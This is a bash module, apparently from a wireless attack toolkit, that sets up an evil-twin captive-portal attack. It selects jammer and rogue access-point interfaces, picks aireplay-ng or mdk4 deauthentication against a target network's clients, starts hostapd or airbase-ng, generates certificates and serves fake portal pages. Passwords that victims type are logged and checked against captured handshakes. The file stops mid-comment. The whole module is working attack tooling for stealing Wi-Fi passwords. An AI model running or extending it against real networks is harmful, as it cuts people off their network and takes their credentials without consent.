#!/usr/bin/env bash

# ============================================================ #
# =============== < Captive Portal Parameters > ============== #
# ============================================================ #
CaptivePortalState="Not Ready"

CaptivePortalPassLog="$CAPCAPPath/attacks/Captive Portal/pwdlog"
CaptivePortalNetLog="$CAPCAPPath/attacks/Captive Portal/netlog"

# kea-dhcp4's memfile lease backend refuses any lease-database path outside
# /var/lib/kea (hardcoded restriction, also the only path the distro's
# kea-dhcp4 AppArmor profile grants write access to), so the lease file
# can't live under CAPCAPWorkspacePath like the rest of the attack's state.
CaptivePortalKeaLeases="/var/lib/kea/kea-leases4.csv"

# ============= < Virtual Network Configuration > ============ #
# To avoid collapsing with an already existing network,
# we'll use a somewhat uncommon network and server IP.
CaptivePortalGatewayAddress="10.254.254.1"
CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*}
CaptivePortalGatewayPoolStart=100
CaptivePortalGatewayPoolEnd=254


# ============================================================ #
# ============== < Captive Portal Subroutines > ============== #
# ============================================================ #
captive_portal_unset_jammer_interface() {
  if [ ! "$CaptivePortalJammerInterface" ]; then
    CaptivePortalJammerInterfaceOriginal=""
    return 1
  fi

  # Deallocate the interface from CapCapInterfaces so it can be reused.
  capcap_deallocate_interface "$CaptivePortalJammerInterface" 2>/dev/null

  CaptivePortalJammerInterface=""
  CaptivePortalJammerInterfaceOriginal=""

  # Check if we're automatically selecting the interface & skip
  # this one if so to take the user back properly.
  local interfacesAvailable
  readarray -t interfacesAvailable < <(attack_targetting_interfaces)

  if [ ${#interfacesAvailable[@]} -le 1 ]; then return 2; fi
}

captive_portal_set_jammer_interface() {
  if [ "$CaptivePortalJammerInterface" ]; then return 0; fi

  if [ ! "$CaptivePortalJammerInterfaceOriginal" ]; then
    echo "Running get jammer interface." >> $CAPCAPOutputDevice
    if [ "$CAPCAPJammerInterface" ]; then
      CapCapInterfaceSelected="$CAPCAPJammerInterface"
    elif ! capcap_get_interface attack_targetting_interfaces \
      "$CaptivePortalJammerInterfaceQuery"; then
      echo "Failed to get jammer interface" >> $CAPCAPOutputDevice
      return 1
    fi
    CaptivePortalJammerInterfaceOriginal=$CapCapInterfaceSelected
  fi

  local selectedInterface=$CaptivePortalJammerInterfaceOriginal

  if ! capcap_allocate_interface $selectedInterface; then
    echo "Failed to allocate jammer interface" >> $CAPCAPOutputDevice
    return 2
  fi

  echo "Succeeded get jammer interface." >> $CAPCAPOutputDevice
  # Get the actual interface to use (renamed or original)
  if interface_is_real "$selectedInterface"; then
    CaptivePortalJammerInterface="$selectedInterface"
  else
    CaptivePortalJammerInterface=${CapCapInterfaces[$selectedInterface]}
  fi
}

captive_portal_ap_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

captive_portal_unset_ap_interface() {
  if [ ! "$CaptivePortalAccessPointInterface" ]; then
    CaptivePortalAccessPointInterfaceOriginal=""
    return 1
  fi

  # Check if it's a virtual interface (ends with 'v')
  if [[ "$CaptivePortalAccessPointInterface" == *v ]]; then
    if [ -n "$CaptivePortalAccessPointInterface" ] && interface_physical "$CaptivePortalAccessPointInterface"; then
      if ! iw dev "$CaptivePortalAccessPointInterface" del \
        &>> $CAPCAPOutputDevice; then
        echo "Warning: Unable to remove virtual interface $CaptivePortalAccessPointInterface" >> $CAPCAPOutputDevice
      fi
    fi
  else
    # Non-virtual: deallocate the interface from CapCapInterfaces so it can be reused.
    capcap_deallocate_interface "$CaptivePortalAccessPointInterface" 2>/dev/null
  fi

  CaptivePortalAccessPointInterface=""
  CaptivePortalAccessPointInterfaceOriginal=""
}

captive_portal_set_ap_interface() {
  if [ "$CaptivePortalAccessPointInterface" ]; then return 0; fi

  if [ ! "$CaptivePortalAccessPointInterfaceOriginal" ]; then
    echo "Running get ap interface." >> $CAPCAPOutputDevice
    if [ "$CAPCAPAPInterface" ]; then
      CapCapInterfaceSelected="$CAPCAPAPInterface"
    elif ! capcap_get_interface captive_portal_ap_interfaces \
      "$CaptivePortalAccessPointInterfaceQuery"; then
      echo "Failed to get ap interface" >> $CAPCAPOutputDevice
      return 1
    fi
    CaptivePortalAccessPointInterfaceOriginal=$CapCapInterfaceSelected
  fi

  local selectedInterface=$CaptivePortalAccessPointInterfaceOriginal

  if ! capcap_allocate_interface $selectedInterface; then
    echo "Failed to allocate ap interface" >> $CAPCAPOutputDevice
    return 2
  fi

  echo "Succeeded get ap interface." >> $CAPCAPOutputDevice
  # Get the actual interface to use (renamed or original)
  if interface_is_real "$selectedInterface"; then
    CaptivePortalAccessPointInterface="$selectedInterface"
  else
    CaptivePortalAccessPointInterface=${CapCapInterfaces[$selectedInterface]}
  fi

  # If interfaces are the same, we need an independent virtual interface.
  if [ "$CaptivePortalAccessPointInterface" = \
    "$CaptivePortalJammerInterface" ]; then
    # TODO: Make capcap's interface services manage virtual interfaces.
    # Have capcap_get_interface return a virutal interface if the primary
    # interface is in used by something else (virtual reservation?).
    echo "Virtual interface required, attempting." >> $CAPCAPOutputDevice
    # Use the renamed interface (the key that maps to original), not the original
    local physicalInterface="$selectedInterface"
    if ! interface_is_real "$selectedInterface"; then
      # selectedInterface is renamed, use it directly
      physicalInterface="$selectedInterface"
    fi
    if ! iw dev "$physicalInterface" interface \
      add "${physicalInterface}v" type managed \
      2>> $CAPCAPOutputDevice; then
      echo -e "$CAPCAPVLine $CaptivePortalCannotStartInterfaceError"
      sleep 5
      return 2
    fi
    echo "Virtual interface created successfully." >> $CAPCAPOutputDevice

    # Keep NetworkManager off the freshly created virtual interface. The
    # virtual AP interface shares a single radio (phy) with the jammer's
    # monitor interface; if NM manages it, its periodic background scans
    # yank that radio off the fixed channel, and airodump-ng on the monitor
    # interface starts reporting "fixed channel <iface>: -1". Hold it down
    # until the AP service brings it up on its own channel.
    if [ -x "$(command -v nmcli)" ]; then
      nmcli device set "${physicalInterface}v" managed no \
        &>> $CAPCAPOutputDevice
    fi
    ip link set "${physicalInterface}v" down &>> $CAPCAPOutputDevice

    CaptivePortalAccessPointInterface=${physicalInterface}v
  fi
}

# Reports whether a channel number is valid and, if the access point
# interface's bands are known, whether that interface can operate on it.
captive_portal_channel_supported() {
  local channel="$1"
  local bands="$2"

  if [ "$channel" -ge 1 ] 2>/dev/null && [ "$channel" -le 14 ] 2>/dev/null; then
    [ "$bands" = "unknown" ] && return 0
    [[ "$bands" == *"2.4GHz"* ]] && return 0
    return 1
  fi

  if [ "$channel" -ge 36 ] 2>/dev/null && [ "$channel" -le 177 ] 2>/dev/null; then
    [ "$bands" = "unknown" ] && return 0
    [[ "$bands" == *"5GHz"* ]] && return 0
    return 1
  fi

  return 1
}

captive_portal_unset_ap_channel() {
  if [ ! "$CaptivePortalAccessPointChannel" ]; then return 1; fi

  CaptivePortalAccessPointChannel=""

  # Since we auto-select when on auto, trigger the undo-chain.
  if [ "$CAPCAPAuto" ]; then return 2; fi
}

# Lets the operator run the rogue access point on a different channel (and
# band) than the target. On a two-radio setup the jammer stays on the target's
# channel while the evil twin is served on the longer-range, less-regulated
# band (or vice versa); a single radio cannot do both, so the jammer follows
# the AP's channel and a warning is printed.
captive_portal_set_ap_channel() {
  if [ "$CaptivePortalAccessPointChannel" ]; then return 0; fi

  captive_portal_unset_ap_channel

  # Auto mode: honor --ap-channel, otherwise mirror the target's channel.
  if [ "$CAPCAPAuto" ]; then
    local autoChannel="${CAPCAPAPChannel:-$CapCapTargetChannel}"

    # Validate against the AP interface's bands so auto mode fails loudly here
    # (e.g. a 2.4GHz-only card asked to host a 5GHz channel) instead of dying
    # silently at hostapd with the DHCP/web services left with no interface.
    interface_bands "$CaptivePortalAccessPointInterface" 2>/dev/null
    local autoBands="${InterfaceBands:-unknown}"
    if ! captive_portal_channel_supported "$autoChannel" "$autoBands"; then
      # The target may sit on a band this card cannot serve (a 5GHz target
      # with a 2.4GHz-only AP interface is the common case). Bailing out here
      # used to close every service without the operator understanding why,
      # so fall back to a channel the card really supports and keep going.
      local fallbackChannel=""
      if [[ "$autoBands" == *"2.4GHz"* ]]; then
        fallbackChannel=6
      elif [[ "$autoBands" == *"5GHz"* ]]; then
        fallbackChannel=36
      fi
      if [ -z "$fallbackChannel" ]; then
        capcap_conditional_bail "$CaptivePortalAPChannelUnsupportedAutoError"
        return 2
      fi
      echo "[!] AP interface cannot host channel $autoChannel (bands: $autoBands); using $fallbackChannel instead." \
        >> $CAPCAPOutputDevice
      capcap_status "AP_CHANNEL_FALLBACK from=$autoChannel to=$fallbackChannel"
      autoChannel=$fallbackChannel
    fi

    CaptivePortalAccessPointChannel="$autoChannel"
    return 0
  fi

  interface_bands "$CaptivePortalAccessPointInterface" 2>/dev/null
  local apBands="${InterfaceBands:-unknown}"

  # Loop the option menu so backing out of the custom-channel entry (0)
  # returns here instead of aborting the whole step.
  local channelNotice=""
  while true; do
    capcap_header

    echo -e "$CAPCAPVLine $CaptivePortalAPChannelQuery"
    echo

    capcap_target_show

    # A guard (e.g. target band unsupported by the AP interface) leaves a
    # notice here that persists across the screen redraw until resolved.
    if [ "$channelNotice" ]; then
      echo -e "$CAPCAPVLine $channelNotice"
      echo
    fi

    local choices=(
      "$CaptivePortalAPChannelTargetOption"
      "$CaptivePortalAPChannelCustomOption"
      "$CAPCAPGeneralBackOption"
    )

    io_query_choice "" choices[@]

    echo

    case "$IOQueryChoice" in
      "$CaptivePortalAPChannelTargetOption")
        # The AP interface may not support the target's band (e.g. a 2.4GHz-only
        # card against a 5GHz target). Catch it here instead of failing later at
        # hostapd, and steer the user to a custom channel on a supported band.
        if ! captive_portal_channel_supported "$CapCapTargetChannel" "$apBands"; then
          channelNotice="$CaptivePortalAPChannelUnsupportedWarning"
          continue
        fi
        channelNotice=""
        CaptivePortalAccessPointChannel="$CapCapTargetChannel"
        break
        ;;
      "$CaptivePortalAPChannelCustomOption")
        local customChannel=""
        local channelError=""
        local customBack=""
        while [ ! "$customChannel" ]; do
          # Redraw a clean screen on every attempt so this prompt matches the
          # rest of the interface (header + target block + input examples).
          capcap_header

          echo -e "$CAPCAPVLine $CaptivePortalAPChannelQuery"
          echo

          capcap_target_show

          echo -e "$CAPCAPVLine $CaptivePortalAPChannelCustomNotice"
          echo
          echo -e "     $CaptivePortalAPChannelExampleTip ${CBlu}6$CClr, ${CBlu}11$CClr (2.4GHz)"
          echo -e "     $CaptivePortalAPChannelExampleTip ${CBlu}36$CClr, ${CBlu}149$CClr (5GHz)"
          echo -e "     $CaptivePortalAPChannelBandsTip $CClr$apBands"
          echo -e "${CSRed}[${CSYel}0${CSRed}]${CClr} $CAPCAPGeneralBackOption"
          echo

          if [ "$channelError" ]; then
            echo -e "$CAPCAPVLine $CaptivePortalAPChannelInvalidError"
            echo
          fi

          echo -ne "$CAPCAPPrompt"
          read customChannel

          # 0 returns to the channel-option menu above.
          if [ "$customChannel" = "0" ]; then
            customBack=1
            break
          fi

          if ! [[ "$customChannel" =~ ^[0-9]+$ ]] || \
            ! captive_portal_channel_supported "$customChannel" "$apBands"; then
            channelError=1
            customChannel=""
          fi
        done

        # Chose to go back: re-display the option menu.
        if [ "$customBack" ]; then continue; fi

        echo

        CaptivePortalAccessPointChannel="$customChannel"
        break
        ;;
      "$CAPCAPGeneralBackOption")
        captive_portal_unset_ap_channel
        return -1
        ;;
      *)
        captive_portal_unset_ap_channel
        return 1
        ;;
    esac
  done

  # Warn when the chosen band differs from the target's while the jammer and
  # access point share a single radio, which cannot cover both at once.
  local targetChannel=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
  local apChannel=$(echo "$CaptivePortalAccessPointChannel" | grep -oE '[0-9]+' | head -1)
  local targetIs5=0 apIs5=0
  [ "$targetChannel" -gt 14 ] 2>/dev/null && targetIs5=1
  [ "$apChannel" -gt 14 ] 2>/dev/null && apIs5=1
  if [ "$targetIs5" != "$apIs5" ]; then
    interface_physical "$CaptivePortalAccessPointInterface"
    local apPhysical="$InterfacePhysical"
    interface_physical "$CaptivePortalJammerInterface"
    local jammerPhysical="$InterfacePhysical"
    if [ "$apPhysical" ] && [ "$apPhysical" = "$jammerPhysical" ]; then
      echo -e "$CAPCAPVLine $CaptivePortalAPChannelSharedRadioWarning"
      sleep 5
    fi
  fi
}

function captive_portal_unset_deauth_method() {
  if [ ! "$CaptivePortalJammerType" ]; then return 1; fi

  CaptivePortalJammerType=""
  option_deauth=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$CAPCAPAuto" ]; then return 2; fi
}

function captive_portal_set_deauth_method() {
  if [ "$CaptivePortalJammerType" ]; then
    option_deauth="$CaptivePortalJammerType"
    return 0
  fi
  if ! interface_is_wireless "$CaptivePortalAccessPointInterface"; then
    return 0
  fi

  captive_portal_unset_deauth_method

  # There is a right answer here, so there is no question. mdk4 stays silent
  # until it sees live client traffic and some adapters never let it get that
  # far; aireplay-ng works on everything. Choosing it for the operator removes
  # a screen, and removes the chance of an empty answer leaving the attack
  # running with no deauthentication at all.
  local methodName="aireplay-ng"
  case "${CAPCAPDeauthMethod:-}" in
    mdk4)
      option_deauth=1
      methodName="mdk4"
      ;;
    "" | aireplay | aireplay-ng)
      option_deauth=2
      ;;
    *)
      # shellcheck disable=SC2059
      echo -e "$CAPCAPVLine $(printf "${CAPCAPDeauthMethodUnknown:-Unknown --deauth-method '%s', using aireplay-ng.}" \
        "$CAPCAPDeauthMethod")" >&2
      option_deauth=2
      ;;
  esac

  echo
  # shellcheck disable=SC2059
  echo -e "$CAPCAPVLine $(printf "${CAPCAPDeauthMethodUsing:-Deauthentication method: %s}" "$methodName")"
  local otherMethod="aireplay-ng"
  [ "$option_deauth" = 2 ] && otherMethod="mdk4"
  # shellcheck disable=SC2059
  echo -e "$CAPCAPVLine ${CClr}$(printf "${CAPCAPDeauthMethodOverrideTip:-Want the other one? Start with --deauth-method %s.}" \
    "$otherMethod")${CClr}"

  CaptivePortalJammerType="$option_deauth"
}

function captive_portal_unset_deauth_target() {
  # Drop the cached client-scan result so the next time we land on the
  # deauth-target step (e.g. after going back and re-picking an interface)
  # the station scan runs again instead of reusing stale results.
  CapCapTargetClientsScanned=""

  if [ ! "$CaptivePortalTargetClients" ]; then return 1; fi
  CaptivePortalTargetClients=""
}

function captive_portal_set_deauth_target() {
  if [ "$CaptivePortalTargetClients" ]; then return 0; fi

  captive_portal_unset_deauth_target

  if [ "$CAPCAPAuto" ] || ! interface_is_wireless "$CaptivePortalJammerInterface"; then
    CaptivePortalTargetClients="broadcast"
    return 0
  fi

  if [ "$CapCapTargetClientsScanned" != "${CapCapTargetMAC^^}:$CapCapTargetChannel" ]; then
    echo -e "$CAPCAPVLine $CAPCAPStartingScannerNotice"
    capcap_target_scan_clients \
      "$CaptivePortalJammerInterface" "$CapCapTargetMAC" "$CapCapTargetChannel"
  fi

  local broadcastCapable=0
  if [ "$CaptivePortalJammerType" = "2" ]; then
    broadcastCapable=1
  fi

  local selectedClients
  if ! capcap_target_select_clients selectedClients "$broadcastCapable"; then
    return 1
  fi
  CaptivePortalTargetClients="${selectedClients:-broadcast}"
}

function captive_portal_unset_ap_service() {
  if [ ! "$CaptivePortalAPService" ]; then return 1; fi

  CaptivePortalAPService=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$CAPCAPAuto" ]; then return 2; fi

  if ! interface_is_wireless "$CaptivePortalAccessPointInterface"; then
    return 3;
  fi
}

function captive_portal_set_ap_service() {
  if [ "$CaptivePortalAPService" ]; then
    if ! type -t ap_service_start &> /dev/null; then
      # AP Service: Load the service's helper routines.
      source "$CAPCAPLibPath/ap/$CaptivePortalAPService.sh"
    fi
    return 0
  fi
  if ! interface_is_wireless "$CaptivePortalAccessPointInterface"; then
    return 0
  fi

  captive_portal_unset_ap_service

  local -r CaptivePortalAPChannelEffective="${CaptivePortalAccessPointChannel:-$CapCapTargetChannel}"

  if [ "$CAPCAPAuto" ]; then
    if [ "$CAPCAPAPService" ]; then
      CaptivePortalAPService="$CAPCAPAPService"
    # DFS channels (52-64, 100-144) require airbase-ng since hostapd
    # needs driver CAC/radar support which USB adapters lack. The check
    # uses the rogue AP's channel, which may differ from the target's.
    elif [ "$CaptivePortalAPChannelEffective" -ge 52 -a "$CaptivePortalAPChannelEffective" -le 64 ] 2>/dev/null || \
         [ "$CaptivePortalAPChannelEffective" -ge 100 -a "$CaptivePortalAPChannelEffective" -le 144 ] 2>/dev/null; then
      CaptivePortalAPService="airbase-ng"
    else
      CaptivePortalAPService="hostapd"
    fi
  else
    capcap_header

    echo -e "$CAPCAPVLine $CaptivePortalAPServiceQuery"
    echo


    capcap_target_show

    local choices=(
      "$CaptivePortalAPServiceHostapdOption"
      "$CaptivePortalAPServiceAirbaseOption"
      "$CAPCAPGeneralBackOption"
    )
    io_query_choice "" choices[@]

    echo

    case "$IOQueryChoice" in
      "$CaptivePortalAPServiceHostapdOption")
        CaptivePortalAPService="hostapd" ;;
      "$CaptivePortalAPServiceAirbaseOption")
        CaptivePortalAPService="airbase-ng" ;;
      "$CAPCAPGeneralBackOption")
        return 1
        ;;
    *)
      capcap_conditional_bail "Invalid AP service selected!"
      return 1
      ;;
    esac
  fi

  # AP Service: Load the service's helper routines.
  source "$CAPCAPLibPath/ap/$CaptivePortalAPService.sh"
}

captive_portal_unset_authenticator() {
  if [ ! "$CaptivePortalAuthenticatorMode" ]; then return 0; fi

  case "$CaptivePortalAuthenticatorMode" in
    "hash"*)
      echo "Unset hash is done automatically." >> $CAPCAPOutputDevice ;;
  esac

  CaptivePortalAuthenticatorMode=""

  return 1
}

captive_portal_set_authenticator() {
  if [ "$CaptivePortalAuthenticatorMode" ]; then
    case "$CaptivePortalAuthenticatorMode" in
      "hash"*)
        if [ "$CaptivePortalHashPath" ]; then
          echo "Captive Portal authentication mode is already set, skipping!" \
            >> $CAPCAPOutputDevice
          return 0
        fi
        ;;
    esac
  fi

  captive_portal_unset_authenticator

  # A portal that ships its own submit.php records what the visitor typed and
  # picks its own error/success page. Verifying a password against a handshake
  # would add two prompts (the method, then a path to a .cap that usually does
  # not exist yet) and change nothing the visitor sees, so those portals skip
  # the whole step.
  local -r __portalDir="$CAPCAPPath/attacks/Captive Portal/sites/$CaptivePortalUserInterface.portal"
  if [ -f "$__portalDir/submit.php" ]; then
    CaptivePortalAuthenticatorMode="$CaptivePortalVerificationMethodNoneOption"
    echo
    echo -e "$CAPCAPVLine ${CaptivePortalVerificationMethodNoneNotice}"
    sleep 1
    return 0
  fi

  if [ "$CAPCAPAuto" ]; then
    CaptivePortalAuthenticatorMode="$CaptivePortalVerificationMethodCowpattyOption"
  else
    capcap_header

    echo -e "$CAPCAPVLine $CaptivePortalVerificationMethodQuery"
    echo

    capcap_target_show

    local choices=(
      "$CaptivePortalVerificationMethodCowpattyOption"
      "$CaptivePortalVerificationMethodAircrackNG"
    )

    # Add pyrit to the options if available.
    if [ -x "$(command -v pyrit)" ]; then
      choices+=("$CaptivePortalVerificationMethodPyritOption")
    fi

    # Add back option.
    choices+=("$CAPCAPGeneralBackOption")

    io_query_choice "" choices[@]

    echo

    CaptivePortalAuthenticatorMode="${IOQueryChoice}"
  fi

  # If we're going back, reset everything and abort.
  if [[ \
    "$CaptivePortalAuthenticatorMode" == \
    "$CAPCAPGeneralBackOption" ]]; then
    captive_portal_unset_authenticator
    return -1
  fi
  #fi

  # Process the authentication method selected.
  local result=1 # Assume failure at first.
  case "$CaptivePortalAuthenticatorMode" in
    "hash"*)
      # Pass default path if no path is set yet.
      if [ ! "$CaptivePortalHashPath" ]; then
        CaptivePortalHashPath="$CAPCAPPath/attacks/Handshake Snooper/handshakes/$CapCapTargetSSIDClean-$CapCapTargetMAC.cap"
      fi

      capcap_hash_get_path \
        "$CaptivePortalHashPath" "$CapCapTargetMAC" "$CapCapTargetSSID"
      result=$?

      # Only cache the path once it actually resolved to a real file. On
      # failure or back-out, clear it: leaving a non-empty bogus value here
      # makes the next attempt (e.g. after switching verification method) skip
      # the default-path derivation and the "use found hash" offer, dropping
      # the user straight into the manual path prompt.
      if [ $result -eq 0 ] && [ -f "$CapCapHashPath" ] && [ -s "$CapCapHashPath" ]; then
        CaptivePortalHashPath="$CapCapHashPath"
      else
        CaptivePortalHashPath=""
      fi

      if [ $result -eq 255 ] || [ $result -eq -1 ]; then
        # User backed out; bubble up so caller can show previous menu.
        return -1
      fi

      if [ $result -ne 0 ]; then
        echo "Failed to set a hash path!" >> $CAPCAPOutputDevice
      fi
      ;;
  esac

  # Assure authentication method processing succeeded, abort otherwise.
  if [ $result -ne 0 ]; then
    echo "Auth-mode error code $result!" >> $CAPCAPOutputDevice
    return 1
  fi
}

captive_portal_run_certificate_generator() {
  capcap_window_open "" \
    "Generating Self-Signed SSL Certificate" "" "#000000" "#CCCCCC" \
    "openssl req -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout \"$CAPCAPWorkspacePath/server.pem\" -out \"$CAPCAPWorkspacePath/server.pem\""
    # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
  chmod 400 "$CAPCAPWorkspacePath/server.pem"
}

captive_portal_unset_certificate() {
  if [ ! "$CaptivePortalSSL" ]; then return 1; fi
  # WARNING: The server configuration depends on whether the certificate
  # file exists and is positioned in the proper location. The check above
  # could unsynchronize with the certificate file if we're not careful!
  sandbox_remove_workfile "$CAPCAPWorkspacePath/server.pem"
  CaptivePortalSSL=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$CAPCAPAuto" ]; then return 2; fi
}

# Create Self-Signed SSL Certificate
captive_portal_set_certificate() {
  if [ \
      "$CaptivePortalSSL" = "disabled" -o \
      "$CaptivePortalSSL" = "enabled" -a \
      -f "$CAPCAPWorkspacePath/server.pem" ]; then
    echo "Captive Portal SSL mode already set to $CaptivePortalSSL!" \
      >> $CAPCAPOutputDevice
    return 0
  fi

  # TODO: This is temporary solution, refactor this.
  if [ "$CaptivePortalSSL" = "enabled" ]; then
    local -r restoring=true
  fi

  captive_portal_unset_certificate

  # Check existance of ssl certificate within capcap with file size > 0
  # If user-supplied (fancy) certificate exists, copy it to capcapspace.
  if [ \
    -f "$CAPCAPPath/attacks/Captive Portal/certificate/server.pem" -a \
    -s "$CAPCAPPath/attacks/Captive Portal/certificate/server.pem" \
    ]; then
    cp "$CAPCAPPath/attacks/Captive Portal/certificate/server.pem" \
      "$CAPCAPWorkspacePath/server.pem"

    CaptivePortalSSL="enabled" # Enabled if sourcing user certificate

    echo "Captive Portal certificate was user supplied, skipping query!" \
      >> $CAPCAPOutputDevice
    return 0
  fi


  # Check if we're restoring and we need to re-create certificate.
  if [ "$restoring" ]; then
    if ! captive_portal_run_certificate_generator; then
      capcap_conditional_bail "cert-gen failed!"
      return 2
    fi
    CaptivePortalSSL="enabled"
    return 0
  fi


  if [ "$CAPCAPAuto" ]; then
    CaptivePortalSSL="disabled"
  else
    local choices=(
      "$CaptivePortalCertificateSourceGenerateOption"
      "$CaptivePortalCertificateSourceRescanOption"
      "$CaptivePortalCertificateSourceDisabledOption"
      "$CAPCAPGeneralBackOption"
    )

    io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]

    echo

    case "$IOQueryChoice" in
      "$CaptivePortalCertificateSourceGenerateOption")
        # If cert generator fails, gtfo, something broke!
        if ! captive_portal_run_certificate_generator; then
          capcap_conditional_bail "cert-gen failed!"
          return 2
        fi
        CaptivePortalSSL="enabled"
        ;;

      "$CaptivePortalCertificateSourceRescanOption")
        captive_portal_set_certificate
        return $?
        ;;

      "$CaptivePortalCertificateSourceDisabledOption")
        CaptivePortalSSL="disabled"
        ;;

      "$CAPCAPGeneralBackOption")
        return 1
        ;;
      *)
        capcap_conditional_bail "Unknown cert-gen option!"
        return 2
        ;;
    esac
  fi
}

captive_portal_unset_connectivity() {
  if [ ! "$CaptivePortalConnectivity" ]; then return 1; fi
  CaptivePortalConnectivity=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$CAPCAPAuto" ]; then return 2; fi
}

captive_portal_set_connectivity() {
  if [ "$CaptivePortalConnectivity" ]; then return 0; fi

  captive_portal_unset_connectivity

  if [ "$CAPCAPAuto" ]; then
    CaptivePortalConnectivity="disconnected"
  else
    local choices=(
      "$CaptivePortalConnectivityDisconnectedOption"
      "$CaptivePortalConnectivityEmulatedOption"
      "$CAPCAPGeneralBackOption"
    )
    io_query_choice "$CaptivePortalConnectivityQuery" choices[@]

    case "$IOQueryChoice" in
      "$CaptivePortalConnectivityDisconnectedOption")
        CaptivePortalConnectivity="disconnected" ;;
      "$CaptivePortalConnectivityEmulatedOption")
        CaptivePortalConnectivity="emulated" ;;
      "$CAPCAPGeneralBackOption")
        return 1
        ;;
      *)
        capcap_conditional_bail "Unknown connectivity option!"
        return 2
        ;;
    esac
  fi
}

captive_portal_unset_user_interface() {
  if [ -z "$CaptivePortalUserInterface" ]; then return 1; fi
  CaptivePortalUserInterface=""
}

captive_portal_set_user_interface() {
  local -r attackPath="$CAPCAPPath/attacks/Captive Portal"

  # Skip setting UI if one is selected and is a custom or a generic portal.
  if [ "$CaptivePortalUserInterface" != "" ] && [ \
    -d "$attackPath/sites/$CaptivePortalUserInterface.portal" -o \
    -f "$attackPath/generic/languages/$CaptivePortalUserInterface.lang" ]; then
    return 0
  fi

  captive_portal_unset_user_interface

  if [ "$CAPCAPAuto" ]; then
    # Auto mode: use generic English portal.
    if [ -f "$attackPath/generic/languages/English.lang" ]; then
      CaptivePortalUserInterface="English"
      return 0
    fi
    return 1
  fi

  local sites=()

  # Attempt adding generic portals only if the directory exists.
  if [ -d "$CAPCAPPath/attacks/Captive Portal/generic/languages" ]; then
    # Normalize the names of the generic portals for presentation.
    for site in "$CAPCAPPath/attacks/Captive Portal/generic/languages/"*.lang; do
      sites+=("${CaptivePortalGenericInterfaceOption}_$(basename "${site%.lang}")")
    done
  fi

  # Attempt adding custom portals only if the directory exists.
  if [ -d "$CAPCAPPath/attacks/Captive Portal/sites" ]; then
    # Retrieve available portal sites and strip the .portal extension.
    for site in "$CAPCAPPath/attacks/Captive Portal/sites/"*.portal; do
      sites+=("$(basename "${site%.portal}")")
    done
  fi

  local sitesIdentifier=("${sites[@]/_*/}" "$CAPCAPGeneralBackOption")
  local sitesLanguage=("${sites[@]/*_/}")

  format_center_dynamic "$CRed[$CYel%02d$CRed]$CClr %-44b $CBlu%10s$CClr"
  local queryFieldOptionsFormat=$FormatCenterDynamic

  capcap_header

  echo -e "$CAPCAPVLine $CaptivePortalUIQuery"

  echo

  capcap_target_show "$CapCapTargetSSID" "$CapCapTargetEncryption" \
    "$CapCapTargetChannel" "$CapCapTargetMAC" "$CapCapTargetMaker"

  io_query_format_fields "" "$queryFieldOptionsFormat\n" \
    sitesIdentifier[@] sitesLanguage[@]

  echo

  local site="${IOQueryFormatFields[0]}"
  local siteLanguage="${IOQueryFormatFields[1]}"
  local siteIdentifier="${site}_${siteLanguage}"

  case "$site" in
    "$CaptivePortalGenericInterfaceOption")
      CaptivePortalUserInterface=$siteLanguage
    #  source "$CAPCAPPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
    #  captive_portal_generic
      ;;
    "$CAPCAPGeneralBackOption")
      captive_portal_unset_user_interface
      return 1
      ;;
    *)
      CaptivePortalUserInterface=$siteIdentifier
      ;;
  esac
}


captive_portal_get_client_IP() {
  if [ -f "$CaptivePortalPassLog/$CapCapTargetSSIDClean-$CapCapTargetMAC-IP.log" ]; then
    MatchedClientIP=$(
      cat "$CaptivePortalPassLog/$CapCapTargetSSIDClean-$CapCapTargetMAC-IP.log" | \
        sed '/^\s*$/d' | tail -n 1 | head -n 1
    )
  else
    MatchedClientIP="unknown"
  fi

  echo $MatchedClientIP
}

captive_portal_get_IP_MAC() {
  if [ -f "$CaptivePortalPassLog/$CapCapTargetSSIDClean-$CapCapTargetMAC-IP.log" ] && \
    [ "$(captive_portal_get_client_IP)" != "" ] && \
    [ -f "$CaptivePortalKeaLeases" ]; then
    local IP=$(captive_portal_get_client_IP)
    local MatchedClientMAC=$(
      awk -F, -v ip="$IP" 'NR>1 && $1==ip {mac=$2} END{print mac}' \
        "$CaptivePortalKeaLeases" | \
        tr [:upper:] [:lower:]
    )
    if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
      local MatchedClientMAC="xx:xx:xx:xx:xx:xx"
    fi
  else
    local MatchedClientMAC="unknown"
  fi
  echo $MatchedClientMAC
}

captive_portal_get_MAC_brand() {
  if [ "$(captive_portal_get_IP_MAC)" != "" ]; then
    local MACManufacturer=$( macchanger -l | \
      grep "$(echo "$(captive_portal_get_IP_MAC)" | cut -d ":" -f -3)" | \
      cut -d " " -f 5-)
    if echo "$MACManufacturer" | grep -q x; then
      local MACManufacturer="unknown"
    fi
  else
    local MACManufacturer="unknown"
  fi

  echo $MACManufacturer
}


captive_portal_unset_attack() {
  sandbox_remove_workfile \
    "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  sandbox_remove_workfile \
    "$CAPCAPWorkspacePath/capcap_captive_portal_dns.py"
  sandbox_remove_workfile "$CAPCAPWorkspacePath/lighttpd.conf"
  rm -f "$CaptivePortalKeaLeases" "$CaptivePortalKeaLeases.2"
  sandbox_remove_workfile "$CAPCAPWorkspacePath/captive_portal/check.php"
  sandbox_remove_workfile "$CAPCAPWorkspacePath/captive_portal"

  # Only reset the AP if one has been defined.
  if [ "$CaptivePortalAPService" -a "$(type -t ap_service_reset)" ]; then
    ap_service_reset
  fi
}

# Escape a value so it can be used as the replacement half of a sed s///.
# Only backslash, the delimiter and "&" are metacharacters there: an SSID
# containing "&" would otherwise expand to the matched placeholder text and
# silently corrupt the rendered page, while an unescaped backslash would eat
